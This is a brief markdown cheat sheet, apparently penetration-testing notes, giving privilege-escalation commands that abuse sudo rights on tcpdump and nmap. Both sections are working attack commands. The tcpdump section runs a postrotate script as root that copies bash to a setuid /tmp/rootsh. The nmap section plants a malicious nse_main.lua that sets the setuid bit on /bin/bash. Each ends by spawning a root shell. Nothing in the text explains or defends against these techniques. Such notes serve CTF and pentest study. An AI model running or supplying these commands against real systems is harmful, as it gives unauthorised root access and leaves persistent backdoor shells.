# Sudo

## Tcpdump 

- Make This **Script.sh**
```bash
TF=$(mktemp)
echo '#!/bin/bash' > $TF
echo 'cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh' >> $TF
chmod +x $TF
```

- Then Run Those Commands After You run The **Script.sh**
```bash
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

```bash
/tmp/rootsh -p
```


---

## Nmap 

### If Interactive & script mode is off 
```bash
echo 'os.execute("chmod 4755 /bin/bash")' > /tmp/nse_main.lua
sudo /usr/bin/nmap --datadir=/tmp -sC localhost
```

```bash
/bin/bash -p
```

---

